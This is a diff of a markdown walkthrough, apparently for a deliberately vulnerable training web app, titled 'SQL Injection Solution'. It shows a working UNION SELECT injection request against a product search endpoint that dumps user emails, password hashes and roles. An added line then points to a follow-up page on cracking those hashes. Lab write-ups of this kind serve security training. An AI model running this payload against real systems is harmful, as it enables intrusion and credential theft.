@@ -1,4 +1,6 @@
-# Sql Injection Solutions
+# SQL Injection Solution
+
+
 
 Use this to validate that all products can be returned, including deleted products.
 ```
@@ -95,3 +97,5 @@ Guessing other columns yields success.
 ```
 GET /rest/products/search?q=juice'))%20UNION%20SELECT%20id,email,password,username,createdAt,updatedAt,isActive,role,'9'%20FROM%20Users--
 ```
+
+Now that the admin, and other hashed passwords are exfiltrated, they can can be cracked. Proceed to [Cracking Passwords](cracking-passwords.md).
